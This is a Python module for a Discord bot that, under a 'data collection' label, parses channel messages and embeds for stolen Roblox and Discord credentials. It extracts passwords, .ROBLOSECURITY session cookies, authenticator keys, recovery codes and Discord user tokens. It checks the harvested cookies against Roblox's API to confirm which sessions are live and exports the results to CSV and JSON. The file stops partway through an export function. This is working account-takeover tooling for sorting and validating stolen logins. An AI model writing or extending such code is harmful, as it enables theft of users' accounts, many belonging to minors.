"""
Data collection and export functionality for the Discord bot
"""

import os
import csv
import json
import re
import asyncio
import logging
from datetime import datetime, timedelta
from typing import List, Dict, Any
import discord
from discord.ext import tasks
import requests

from .config import BotConfig
from .utils import sanitize_filename

logger = logging.getLogger(__name__)

class CredentialExtractor:
    """Extracts username and password pairs from Discord messages"""
    
    def __init__(self):
        # Regex patterns for extracting credentials
        self.patterns = [
            # Primary pattern: Username (<number>): ```username``` followed by Password: ```password```
            r'(?i)username\s*\([^)]*\):\s*```([^`]+)```[\s\S]*?password:\s*```([^`]+)```',
            # Alternative pattern: Username: ```username``` followed by Password: ```password```  
            r'(?i)username:\s*```([^`]+)```[\s\S]*?password:\s*```([^`]+)```',
            # Pattern for User: ```username``` followed by Pass: ```password```
            r'(?i)user:\s*```([^`]+)```[\s\S]*?pass:\s*```([^`]+)```',
            # Pattern for Login: ```username``` followed by Password: ```password```
            r'(?i)login:\s*```([^`]+)```[\s\S]*?password:\s*```([^`]+)```',
            # Two-step verification pattern: Username: value followed by Password: value (no code blocks)
            r'(?i)username:\s*([^\n\r]+?)\s*(?:\n|\r\n?).*?password:\s*([^\n\r]+?)(?:\s*\n|\s*\r\n?)',
            # Simple pattern: Username: value followed by Password: value on separate lines
            r'(?i)username:\s*([^\n\r]+?)(?:\n|\r\n?).*?password:\s*([^\n\r]+?)(?:\n|\r\n?|$)',
            # Fallback pattern: Username/User/Login followed by Password without code blocks
            r'(?i)(?:username|user|login)[:\s]*([^\n\r:]+?)[\s]*(?:password|pass)[:\s]*([^\n\r:]+?)(?:\n|$|:)',
        ]
    
    async def extract_from_message(self, message):
        """Extract credentials from a Discord message"""
        credentials = []
        
        # Extract from message content
        if message.content:
            found_creds = self._extract_from_text(message.content)
            for username, password in found_creds:
                additional_data = self._extract_additional_fields(message.content)
                credentials.append({
                    'message_id': message.id,
                    'timestamp': message.created_at.isoformat(),
                    'author': str(message.author),
                    'author_id': message.author.id,
                    'channel': message.channel.name,
                    'channel_id': message.channel.id,
                    'username': username.strip(),
                    'password': password.strip(),
                    'source': 'message_content',
                    'raw_content': message.content,
                    **additional_data
                })
            
            # Extract CAEaAhAB tokens separately (these are authentication tokens, not username/password pairs)
            caeaahab_tokens = self._extract_caeaahab_tokens(message.content)
            for token in caeaahab_tokens:
                additional_data = self._extract_additional_fields(message.content)
                credentials.append({
                    'message_id': message.id,
                    'timestamp': message.created_at.isoformat(),
                    'author': str(message.author),
                    'author_id': message.author.id,
                    'channel': message.channel.name,
                    'channel_id': message.channel.id,
                    'username': '',  # No username for token-based auth
                    'password': '',  # No password for token-based auth
                    'caeaahab_token': token,
                    'source': 'message_content',
                    'raw_content': message.content,
                    **additional_data
                })
            
            # Extract Discord token2 data (Discord user authentication tokens)
            token2_data = self._extract_token2_data(message.content)
            for token_info in token2_data:
                credentials.append({
                    'message_id': message.id,
                    'timestamp': message.created_at.isoformat(),
                    'author': str(message.author),
                    'author_id': message.author.id,
                    'channel': message.channel.name,
                    'channel_id': message.channel.id,
                    'username': token_info.get('username', ''),
                    'password': '',  # No password for token-based auth
                    'token2_full_token': token_info.get('full_token', ''),
                    'token2_user_info': token_info.get('user_info', ''),
                    'token2_timestamp': token_info.get('token_timestamp', ''),
                    'token2_access_method': token_info.get('access_method', ''),
                    'token2_user_id': token_info.get('user_id', ''),
                    'token2_username': token_info.get('discord_username', ''),
                    'source': 'message_content',
                    'raw_content': message.content,
                    'type': 'discord_token2'
                })
        
        # Extract from embeds
        for embed_idx, embed in enumerate(message.embeds):
            embed_text = ""
            
            # Combine embed title, description, and fields
            if embed.title:
                embed_text += f"{embed.title}\n"
            if embed.description:
                embed_text += f"{embed.description}\n"
            
            for field in embed.fields:
                embed_text += f"{field.name}: {field.value}\n"
            
            if embed_text:
                found_creds = self._extract_from_text(embed_text)
                for username, password in found_creds:
                    additional_data = self._extract_additional_fields(embed_text)
                    credentials.append({
                        'message_id': message.id,
                        'timestamp': message.created_at.isoformat(),
                        'author': str(message.author),
                        'author_id': message.author.id,
                        'channel': message.channel.name,
                        'channel_id': message.channel.id,
                        'username': username.strip(),
                        'password': password.strip(),
                        'source': f'embed_{embed_idx}',
                        'raw_content': embed_text,
                        **additional_data
                    })
                
                # Extract CAEaAhAB tokens from embeds
                caeaahab_tokens = self._extract_caeaahab_tokens(embed_text)
                for token in caeaahab_tokens:
                    additional_data = self._extract_additional_fields(embed_text)
                    credentials.append({
                        'message_id': message.id,
                        'timestamp': message.created_at.isoformat(),
                        'author': str(message.author),
                        'author_id': message.author.id,
                        'channel': message.channel.name,
                        'channel_id': message.channel.id,
                        'username': '',  # No username for token-based auth
                        'password': '',  # No password for token-based auth
                        'caeaahab_token': token,
                        'source': f'embed_{embed_idx}',
                        'raw_content': embed_text,
                        **additional_data
                    })
                
                # Extract Discord token2 data from embeds
                token2_data = self._extract_token2_data(embed_text)
                for token_info in token2_data:
                    credentials.append({
                        'message_id': message.id,
                        'timestamp': message.created_at.isoformat(),
                        'author': str(message.author),
                        'author_id': message.author.id,
                        'channel': message.channel.name,
                        'channel_id': message.channel.id,
                        'username': token_info.get('username', ''),
                        'password': '',  # No password for token-based auth
                        'token2_full_token': token_info.get('full_token', ''),
                        'token2_user_info': token_info.get('user_info', ''),
                        'token2_timestamp': token_info.get('token_timestamp', ''),
                        'token2_access_method': token_info.get('access_method', ''),
                        'token2_user_id': token_info.get('user_id', ''),
                        'token2_username': token_info.get('discord_username', ''),
                        'source': f'embed_{embed_idx}',
                        'raw_content': embed_text,
                        'type': 'discord_token2'
                    })
        
        return credentials
    
    def _extract_from_text(self, text):
        """Extract username/password pairs from text using regex patterns"""
        credentials = []
        
        for pattern in self.patterns:
            matches = re.findall(pattern, text, re.MULTILINE | re.DOTALL)
            for match in matches:
                if len(match) == 2:
                    username = match[0].strip()
                    password = match[1].strip()
                    
                    # Enhanced validation
                    if self._is_valid_credential_pair(username, password):
                        credentials.append((username, password))
        
        return credentials
    
    def _is_valid_credential_pair(self, username, password):
        """Validate if username and password pair looks legitimate"""
        # Clean up the values
        username = re.sub(r'^[:\s]+|[:\s]+$', '', username.strip())
        password = re.sub(r'^[:\s]+|[:\s]+$', '', password.strip())
        
        # Basic length checks
        if not username or not password:
            return False
        if len(username) < 2 or len(password) < 2:
            return False
        if len(username) > 100 or len(password) > 100:
            return False
            
        # Filter out obvious non-credentials
        invalid_patterns = [
            r'^https?://',  # URLs
            r'^<[^>]+>$',   # Discord mentions/emojis
            r'^\d+$',       # Pure numbers (likely IDs)
            r'^[A-Z]{1,5}$', # Short all-caps (like "PS", "AD", "AM")
            r'^\*+$',       # Just asterisks
            r'^-+$',        # Just dashes
            r'Profile',     # Common false matches
            r'Check Cookie',
            r'IP Info',
            r'Status',
            r'Premium',
            r'Robux',
            r'Game\d*',     # Game1, Game2, etc.
        ]
        
        for invalid_pattern in invalid_patterns:
            if re.search(invalid_pattern, username, re.IGNORECASE) or re.search(invalid_pattern, password, re.IGNORECASE):
                return False
        
        # Username should typically contain alphanumeric characters
        if not re.search(r'[a-zA-Z0-9]', username) or not re.search(r'[a-zA-Z0-9]', password):
            return False
            
        return True
    
    def _extract_additional_fields(self, text):
        """Extract additional Roblox account information from text"""
        fields = {}
        
        # Define patterns for extracting additional information
        field_patterns = {
            # Code block patterns (original format)
            'robux_incoming_outgoing': r'Robux Incoming/Outgoing:\s*```([^`]+)```',
            'status': r'Status:\s*```([^`]+)```',
            'korblox_headless': r'Korblox/Headless:\s*```([^`]+)```',
            'age': r'Age:\s*```([^`]+)```',
            'rap': r'RAP:\s*```([^`]+)```',
            'saved_payment': r'Saved Payment:\s*```([^`]+)```',
            'authenticator_key': r'Authenticator Key:\s*```([^`]+)```',
            'premium': r'Premium:\s*```([^`]+)```',
            'credit_balance': r'Credit Balance:\s*```([^`]+)```',
            'robux_pending': r'Robux \(Pending\):\s*```([^`]+)```',
            'pin': r'PIN:\s*```([^`]+)```',
            'recovery_codes': r'Recovery Codes:\s*```([^`]+)```',
            
            # Plain text patterns (two-step verification format)
            'ip': [r'IP:\s*```([^`]+)```', r'IP:\s*([^\n\r]+?)(?:\n|\r\n?|$)'],
            'type': r'Type:\s*([^\n\r]+?)(?:\n|\r\n?|$)',
            'verification_status': r'(Two Step Verification|Awaiting User Input)',
            
            # Token patterns (CAEaAhAB authentication tokens)
            'caeaahab_token': r'(CAEaAhAB\.[A-F0-9]+)',
        }
        
        # Extract each field using regex
        for field_name, pattern in field_patterns.items():
            if isinstance(pattern, list):
                # Try multiple patterns for this field
                for p in pattern:
                    match = re.search(p, text, re.IGNORECASE)
                    if match:
                        fields[field_name] = match.group(1).strip()
                        break
            else:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    fields[field_name] = match.group(1).strip()
        
        # Check for authentication types if main fields are not found
        if not any(fields.values()):
            auth_types = []
            auth_pattern = r'\(type:\s*(\w+)\)'
            auth_matches = re.findall(auth_pattern, text, re.IGNORECASE)
            
            for auth_type in auth_matches:
                if auth_type.lower() in ['email', 'crossdevice', 'passkey', 'authenticator']:
                    auth_types.append(auth_type.lower())
            
            if auth_types:
                fields['auth_types'] = ', '.join(auth_types)
        
        return fields
    
    def _extract_caeaahab_tokens(self, text):
        """Extract CAEaAhAB authentication tokens from text"""
        tokens = []
        
        # Pattern for CAEaAhAB tokens (starts with CAEaAhAB followed by long hex string)
        token_pattern = r'(CAEaAhAB\.[A-F0-9]+)'
        
        matches = re.findall(token_pattern, text, re.IGNORECASE)
        
        for match in matches:
            # Validate token format and length
            if len(match) > 20 and '.' in match:  # Basic validation
                tokens.append(match)
        
        return tokens
    
    def _extract_token2_data(self, text):
        """Extract Discord token2 authentication data from text"""
        token_data = []
        
        # Pattern for Discord tokens (base64.random_chars.signature format)
        # Example: MTM4OTIxNTk3NjA1NDA2MzE3NA.GA7ZR6.-j5tDy4A7vitBDQulggvTzCM7m-TKXZnpxpisM
        discord_token_pattern = r'([A-Za-z0-9_-]{20,30}\.[A-Za-z0-9_-]{6,10}\.[A-Za-z0-9_-]{20,40})'
        
        # Find all potential Discord tokens
        token_matches = re.findall(discord_token_pattern, text)
        
        for token in token_matches:
            # Look for associated user info near the token
            token_info = {
                'full_token': token,
                'user_info': '',
                'token_timestamp': '',
                'access_method': '',
                'user_id': '',
                'discord_username': '',
                'username': ''  # For compatibility with existing structure
            }
            
            # Look for patterns around this token to extract user info
            # Pattern: Full Token\nMTM4O... followed by User Info\nusername#0 (id)
            token_context_pattern = rf'(?:Full Token[:\s]*\n?){re.escape(token)}(?:\s*\n?User Info[:\s]*\n?([^(\n]+)\s*\((\d+)\))?'
            context_match = re.search(token_context_pattern, text, re.MULTILINE | re.IGNORECASE)
            
            # Alternative pattern: Look for "User Info:" directly followed by username#disc (id)
            if not context_match:
                user_info_pattern = r'User Info[:\s]*([^#\n]+#\d+)\s*\((\d+)\)'
                user_match = re.search(user_info_pattern, text, re.IGNORECASE)
                if user_match:
                    username_part = user_match.group(1).strip()
                    user_id = user_match.group(2)
                    token_info['discord_username'] = username_part
                    token_info['username'] = username_part
                    token_info['user_info'] = f"{username_part} ({user_id})"
                    token_info['user_id'] = user_id
            
            if context_match:
                if context_match.group(1):  # Username found
                    username_part = context_match.group(1).strip()
                    token_info['discord_username'] = username_part
                    token_info['username'] = username_part  # For compatibility
                    token_info['user_info'] = f"{username_part} ({context_match.group(2)})" if context_match.group(2) else username_part
                if context_match.group(2):  # User ID found
                    token_info['user_id'] = context_match.group(2)
            
            # Look for timestamp information
            timestamp_patterns = [
                r'Timestamp[:\s]*([^\n\r]+)',
                r'(\d{4}-\d{2}-\d{2}[T\s]\d{2}:\d{2}:\d{2}[^\n\r]*)',
                r'([0-9]{4}-[0-9]{2}-[0-9]{2}[T\s][0-9]{2}:[0-9]{2}:[0-9]{2}[^\n\r]*UTC?)',
            ]
            
            for ts_pattern in timestamp_patterns:
                ts_match = re.search(ts_pattern, text, re.IGNORECASE)
                if ts_match:
                    token_info['token_timestamp'] = ts_match.group(1).strip()
                    break
            
            # Look for access method
            access_method_patterns = [
                r'Access Method[:\s]*([^\n\r]+)',
                r'(Web Interface[^\n\r]*)',
                r'(FastAPI[^\n\r]*)',
                r'(Token Access Monitor[^\n\r]*)'
            ]
            
            for am_pattern in access_method_patterns:
                am_match = re.search(am_pattern, text, re.IGNORECASE)
                if am_match:
                    token_info['access_method'] = am_match.group(1).strip()
                    break
            
            # Alternative pattern: Look for structured format like in the image
            # Full Token
            # MTM4O...
            # User Info            Timestamp           Access Method
            # username#0 (id)      2025-07-01 15:43:21 UTC  Web Interface - FastAPI
            structured_pattern = r'Full Token\s*\n' + re.escape(token) + r'\s*\n.*?User Info.*?Timestamp.*?Access Method\s*\n([^#\n]+)#(\d+)\s*\((\d+)\)\s*([^\n]*?UTC)\s*([^\n]*)'
            structured_match = re.search(structured_pattern, text, re.MULTILINE | re.DOTALL | re.IGNORECASE)
            
            if structured_match:
                username = structured_match.group(1).strip()
                user_id = structured_match.group(3).strip()
                timestamp = structured_match.group(4).strip()
                access_method = structured_match.group(5).strip()
                
                token_info['discord_username'] = f"{username}#{structured_match.group(2)}"
                token_info['username'] = f"{username}#{structured_match.group(2)}"
                token_info['user_info'] = f"{username}#{structured_match.group(2)} ({user_id})"
                token_info['user_id'] = user_id
                token_info['token_timestamp'] = timestamp
                token_info['access_method'] = access_method
            
            # Only add if we found a valid Discord token (has proper format)
            if self._is_valid_discord_token(token):
                token_data.append(token_info)
        
        return token_data
    
    def _is_valid_discord_token(self, token):
        """Validate if a token looks like a legitimate Discord token"""
        if not token or len(token) < 50:
            return False
        
        # Discord tokens have specific format: base64.random.signature
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        # Each part should have reasonable length
        if len(parts[0]) < 20 or len(parts[1]) < 6 or len(parts[2]) < 20:
            return False
        
        # Should contain only valid base64 characters and hyphens/underscores
        valid_chars = re.match(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$', token)
        
        return bool(valid_chars)


class RobloxValidator:
    """Validates Roblox CAEaAhAB cookies using the Roblox API"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Roblox/WinInet"
        })
    
    async def validate_cookie(self, cookie: str) -> Dict[str, Any]:
        """
        Validate a Roblox cookie using the authenticated users API
        
        Args:
            cookie: The full cookie including any warning prefix
            
        Returns:
            Dictionary with validation results
        """
        if not cookie:
            return {
                'valid': False,
                'error': 'Cookie cannot be empty'
            }
        
        # Extract just the CAEaAhAB token part if warning prefix exists
        if "_|WARNING:-DO-NOT-SHARE-THIS." in cookie:
            cookie_parts = cookie.split("CAEaAhAB.")
            if len(cookie_parts) > 1:
                cookie = "CAEaAhAB." + cookie_parts[-1]
        
        if not cookie.startswith('CAEaAhAB'):
            return {
                'valid': False,
                'error': 'Invalid cookie format - must contain CAEaAhAB token'
            }
        
        url = "https://users.roblox.com/v1/users/authenticated"
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie}",
            "User-Agent": "Roblox/WinInet",
            "Accept": "application/json"
        }
        
        try:
            # Run the blocking request in a thread pool
            loop = asyncio.get_event_loop()
            response = await loop.run_in_executor(
                None, 
                lambda: requests.get(url, headers=headers, timeout=10)
            )
            
            if response.status_code == 200:
                data = response.json()
                return {
                    'valid': True,
                    'username': data.get('name', ''),
                    'user_id': data.get('id', ''),
                    'display_name': data.get('displayName', ''),
                    'status_code': 200,
                    'validation_timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
                }
            elif response.status_code == 401:
                return {
                    'valid': False,
                    'error': 'Unauthorized - malformed or expired cookie',
                    'status_code': 401,
                    'validation_timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
                }
            elif response.status_code == 403:
                return {
                    'valid': False,
                    'error': 'Cookie is invalid or IP-locked',
                    'status_code': 403,
                    'validation_timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
                }
            else:
                return {
                    'valid': False,
                    'error': f'Unexpected response code: {response.status_code}',
                    'status_code': response.status_code,
                    'validation_timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
                }
                
        except requests.exceptions.RequestException as e:
            return {
                'valid': False,
                'error': f'Request failed: {str(e)}',
                'validation_timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
            }
        except Exception as e:
            return {
                'valid': False,
                'error': f'Validation error: {str(e)}',
                'validation_timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
            }
    
    async def validate_credentials_with_cookies(self, credentials_data: List[Dict]) -> List[Dict]:
        """
        Validate CAEaAhAB tokens in credentials data
        
        Args:
            credentials_data: List of credential dictionaries
            
            
        Returns:
            Updated credentials data with validation results
        """
        updated_credentials = []
        
        for credential in credentials_data:
            # Check if this credential has a CAEaAhAB token
            caeaahab_token = credential.get('caeaahab_token', '')
            
            if caeaahab_token:
                validation_result = await self.validate_cookie(caeaahab_token)
                
                # Add validation results to the credential
                credential['roblox_valid'] = validation_result['valid']
                credential['roblox_validation_timestamp'] = validation_result.get('validation_timestamp', '')
                
                if validation_result['valid']:
                    credential['roblox_username'] = validation_result.get('username', '')
                    credential['roblox_user_id'] = validation_result.get('user_id', '')
                    credential['robux_balance'] = validation_result.get('robux_balance', 0)
                    credential['is_premium'] = validation_result.get('is_premium', False)
                    credential['roblox_status'] = '✅ Valid'
                else:
                    credential['roblox_error'] = validation_result.get('error', '')
                    credential['roblox_status'] = '❌ Invalid'
                
                # Add a small delay to respect rate limits
                await asyncio.sleep(0.5)
            else:
                credential['roblox_status'] = 'No CAEaAhAB token'
            
            updated_credentials.append(credential)
        
        return updated_credentials


class DataCollector:
    """Handles automated data collection and logging"""
    
    def __init__(self, bot):
        self.bot = bot
        self.automated_task = None
        
    def start_automated_collection(self):
        """Start the automated data collection loop"""
        if self.automated_task and not self.automated_task.done():
            logger.warning("Automated collection is already running")
            return
        
        self.automated_task = self._automated_collection_loop.start()
        logger.info("Started automated data collection")
    
    @tasks.loop(hours=BotConfig.COLLECTION_INTERVAL_HOURS)
    async def _automated_collection_loop(self):
        """Main automated data collection loop"""
        logger.info("Running automated data collection...")
        
        for guild in self.bot.guilds:
            try:
                await self._collect_guild_daily_stats(guild)
                # Rate limiting between guilds
                await asyncio.sleep(BotConfig.API_RATE_LIMIT_DELAY)
            except Exception as e:
                logger.error(f"Error collecting data for {guild.name}: {e}")
    
    @_automated_collection_loop.before_loop
    async def _before_automated_collection(self):
        """Wait for bot to be ready before starting collection"""
        await self.bot.wait_until_ready()
        logger.info("Bot is ready, automated collection will start")
    
    async def _collect_guild_daily_stats(self, guild):
        """Collect daily statistics for a guild"""
        try:
            # Calculate member statistics
            online_members = len([m for m in guild.members if m.status != discord.Status.offline])
            bot_count = len([m for m in guild.members if m.bot])
            human_count = guild.member_count - bot_count
            
            # Collect activity data
            activity_data = {
                'date': datetime.now().date().isoformat(),
                'timestamp': datetime.now().isoformat(),
                'guild_id': guild.id,
                'guild_name': guild.name,
                'member_count': guild.member_count,
                'human_count': human_count,
                'bot_count': bot_count,
                'online_members': online_members,
                'text_channels': len(guild.text_channels),
                'voice_channels': len(guild.voice_channels),
                'categories': len(guild.categories),
                'roles': len(guild.roles),
                'emojis': len(guild.emojis),
                'boost_level': guild.premium_tier,
                'boost_count': guild.premium_subscription_count or 0
            }
            
            # Save to daily activity log
            activity_file = os.path.join(BotConfig.LOGS_DIR, 'daily_activity.csv')
            
            # Check if file exists to determine if we need headers
            file_exists = os.path.exists(activity_file)
            
            with open(activity_file, 'a', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=activity_data.keys())
                if not file_exists:
                    writer.writeheader()
                writer.writerow(activity_data)
            
            logger.info(f"Collected daily stats for {guild.name}")
            
        except Exception as e:
            logger.error(f"Error collecting daily stats for {guild.name}: {e}")
    
    async def log_message_activity(self, message):
        """Log message activity in real-time"""
        if not BotConfig.LOG_MESSAGE_ACTIVITY:
            return
        
        try:
            # Prepare message log data
            message_log = {
                'timestamp': datetime.now().isoformat(),
                'server': message.guild.name if message.guild else 'DM',
                'server_id': message.guild.id if message.guild else None,
                'channel': message.channel.name if hasattr(message.channel, 'name') else 'DM',
                'channel_id': message.channel.id,
                'author': str(message.author) if not BotConfig.ANONYMIZE_USERS else f"User_{hash(message.author.id) % 10000}",
                'author_id': message.author.id if BotConfig.COLLECT_USER_IDS else None,
                'content_length': len(message.content),
                'has_attachments': len(message.attachments) > 0,
                'has_embeds': len(message.embeds) > 0,
                'message_type': str(message.type),
                'is_bot': message.author.bot
            }
            
            # Only include content if explicitly enabled
            if BotConfig.COLLECT_MESSAGE_CONTENT:
                message_log['content'] = message.content
            
            # Save to message activity log
            activity_file = os.path.join(BotConfig.LOGS_DIR, 'message_activity.csv')
            
            # Check if file exists to determine if we need headers
            file_exists = os.path.exists(activity_file)
            
            with open(activity_file, 'a', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=message_log.keys())
                if not file_exists:
                    writer.writeheader()
                writer.writerow(message_log)
                
        except Exception as e:
            logger.error(f"Error logging message activity: {e}")
    
    async def cleanup_old_files(self, days: int = 30) -> int:
        """Clean up old data files"""
        cutoff_date = datetime.now() - timedelta(days=days)
        deleted_count = 0
        
        # Check exports directory
        for root, dirs, files in os.walk(BotConfig.EXPORTS_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    file_time = datetime.fromtimestamp(os.path.getctime(file_path))
                    if file_time < cutoff_date:
                        os.remove(file_path)
                        deleted_count += 1
                        logger.info(f"Deleted old file: {file_path}")
                except Exception as e:
                    logger.warning(f"Could not delete file {file_path}: {e}")
        
        return deleted_count

class DataExporter:
    """Handles data export functionality"""
    
    def __init__(self):
        pass
    
    async def export_messages_csv(self, messages_data: List[Dict], filename_base: str) -> str:
        """Export messages data to CSV format"""
        filename = f"{filename_base}.csv"
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        if not messages_data:
            raise ValueError("No messages data to export")
        
        with open(filepath, 'w', newline='', encoding='utf-8') as csvfile:
            # Flatten nested data for CSV
            flattened_data = []
            for msg in messages_data:
                flattened = msg.copy()
                # Convert lists to strings for CSV compatibility
                flattened['attachments'] = json.dumps(msg['attachments'])
                flattened['reactions'] = json.dumps(msg['reactions'])
                flattened_data.append(flattened)
            
            writer = csv.DictWriter(csvfile, fieldnames=flattened_data[0].keys())
            writer.writeheader()
            writer.writerows(flattened_data)
        
        logger.info(f"Exported {len(messages_data)} messages to {filepath}")
        return filepath
    
    async def export_messages_json(self, messages_data: List[Dict], filename_base: str) -> str:
        """Export messages data to JSON format"""
        filename = f"{filename_base}.json"
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        export_data = {
            'export_info': {
                'timestamp': datetime.now().isoformat(),
                'message_count': len(messages_data),
                'export_type': 'messages'
            },
            'messages': messages_data
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Exported {len(messages_data)} messages to {filepath}")
        return filepath
    
    async def export_members_csv(self, members_data: List[Dict], filename_base: str) -> str:
        """Export members data to CSV format"""
        filename = f"{filename_base}.csv"
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        if not members_data:
            raise ValueError("No members data to export")
        
        with open(filepath, 'w', newline='', encoding='utf-8') as csvfile:
            # Flatten nested data for CSV
            flattened_data = []
            for member in members_data:
                flattened = member.copy()
                # Convert list of roles to string
                flattened['roles'] = ', '.join(member['roles'])
                flattened_data.append(flattened)
            
            writer = csv.DictWriter(csvfile, fieldnames=flattened_data[0].keys())
            writer.writeheader()
            writer.writerows(flattened_data)
        
        logger.info(f"Exported {len(members_data)} members to {filepath}")
        return filepath
    
    async def export_members_json(self, members_data: List[Dict], filename_base: str) -> str:
        """Export members data to JSON format"""
        filename = f"{filename_base}.json"
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        export_data = {
            'export_info': {
                'timestamp': datetime.now().isoformat(),
                'member_count': len(members_data),
                'export_type': 'members'
            },
            'members': members_data
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Exported {len(members_data)} members to {filepath}")
        return filepath
    
    async def export_server_stats(self, stats_data: Dict, filename: str) -> str:
        """Export server statistics to JSON format"""
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(stats_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Exported server statistics to {filepath}")
        return filepath
    
    async def export_credentials_csv(self, credentials_data: List[Dict], filename_base: str) -> str:
        """Export credentials data to CSV format"""
        filename = f"{filename_base}.csv"
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        if not credentials_data:
            raise ValueError("No credentials data to export")
        
        # Collect all possible field names from all entries
        all_fieldnames = set()
        for entry in credentials_data:
            all_fieldnames.update(entry.keys())
        
        # Convert to sorted list for consistent column ordering
        fieldnames = sorted(list(all_fieldnames))
        
        # Ensure all entries have all fields (fill missing ones with empty string)
        normalized_data = []
        for entry in credentials_data:
            normalized_entry = {}
            for field in fieldnames:
                normalized_entry[field] = entry.get(field, '')
            normalized_data.append(normalized_entry)
        
        with open(filepath, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(normalized_data)
        
        logger.info(f"Exported {len(credentials_data)} credentials to {filepath}")
        return filepath
    
    async def export_credentials_json(self, credentials_data: List[Dict], filename_base: str) -> str:
        """Export credentials data to JSON format"""
        filename = f"{filename_base}.json"
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        export_data = {
            'export_info': {
                'timestamp': datetime.now().isoformat(),
                'credential_count': len(credentials_data),
                'export_type': 'credentials'
            },
            'credentials': credentials_data
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Exported {len(credentials_data)} credentials to {filepath}")
        return filepath
    
    async def export_credentials_simple_csv(self, credentials_data: List[Dict], filename_base: str) -> str:
        """Export simplified credentials data (username, password, age, type only) to CSV format"""
        filename = f"{filename_base}_simple.csv"
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        if not credentials_data:
            raise ValueError("No credentials data to export")
        
        # Extract only the essential fields
        simplified_data = []
        for entry in credentials_data:
            simple_entry = {
                'username': entry.get('username', ':0') if entry.get('username') else ':0',
                'password': entry.get('password', ':0') if entry.get('password') else ':0',
                'age': entry.get('age', ':0') if entry.get('age') else ':0',
                'type': entry.get('type', ':0') if entry.get('type') else ':0',
                'caeaahab_token': entry.get('caeaahab_token', ':0') if entry.get('caeaahab_token') else ':0',
                'token2_full_token': entry.get('token2_full_token', ':0') if entry.get('token2_full_token') else ':0',
                'token2_user_info': entry.get('token2_user_info', ':0') if entry.get('token2_user_info') else ':0',
                'token2_username': entry.get('token2_username', ':0') if entry.get('token2_username') else ':0',
                'token2_user_id': entry.get('token2_user_id', ':0') if entry.get('token2_user_id') else ':0',
                'roblox_valid': entry.get('roblox_valid', ':0') if entry.get('roblox_valid') is not None else ':0',
                'roblox_username': entry.get('roblox_username', ':0') if entry.get('roblox_username') else ':0',
                'roblox_user_id': entry.get('roblox_user_id', ':0') if entry.get('roblox_user_id') else ':0',
                'robux_balance': entry.get('robux_balance', ':0') if entry.get('robux_balance') is not None else ':0',
                'is_premium': entry.get('is_premium', ':0') if entry.get('is_premium') is not None else ':0',
                'roblox_status': entry.get('roblox_status', ':0') if entry.get('roblox_status') else ':0',
                'roblox_validation_timestamp': entry.get('roblox_validation_timestamp', ':0') if entry.get('roblox_validation_timestamp') else ':0'
            }
            simplified_data.append(simple_entry)
        
        # Define fieldnames in desired order
        fieldnames = ['username', 'password', 'age', 'type', 'caeaahab_token', 'token2_full_token', 'token2_user_info', 'token2_username', 'token2_user_id', 'roblox_valid', 'roblox_username', 'roblox_user_id', 'robux_balance', 'is_premium', 'roblox_status', 'roblox_validation_timestamp']
        
        with open(filepath, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(simplified_data)
        
        logger.info(f"Exported {len(simplified_data)} simplified credentials to {filepath}")
        return filepath
    
    async def export_credentials_simple_json(self, credentials_data: List[Dict], filename_base: str) -> str:
        """Export simplified credentials data (username, password, age, type only) to JSON format"""
        filename = f"{filename_base}_simple.json"
        filepath = os.path.join(BotConfig.EXPORTS_DIR, sanitize_filename(filename))
        
        # Extract only the essential fields
        simplified_data = []
        for entry in credentials_data:
            simple_entry = {
                'username': entry.get('username', ':0') if entry.get('username') else ':0',
                'password': entry.get('password', ':0') if entry.get('password') else ':0',
                'age': entry.get('age', ':0') if entry.get('age') else ':0',
                'type': entry.get('type', ':0') if entry.get('type') else ':0',
                'caeaahab_token': entry.get('caeaahab_token', ':0') if entry.get('caeaahab_token') else ':0',
                'token2_full_token': entry.get('token2_full_token', ':0') if entry.get('token2_full_token') else ':0',
                'token2_user_info': entry.get('token2_user_info', ':0') if entry.get('token2_user_info') else ':0',
                'token2_username': entry.get('token2_username', ':0') if entry.get('token2_username') else ':0',
                'token2_user_id': entry.get('token2_user_id', ':0') if entry.get('token2_user_id') else ':0',
                'roblox_valid': entry.get('roblox_valid', ':0') if entry.get('roblox_valid') is not None else ':0',
                'roblox_username': entry.get('roblox_username', ':0') if entry.get('roblox_username') else ':0',
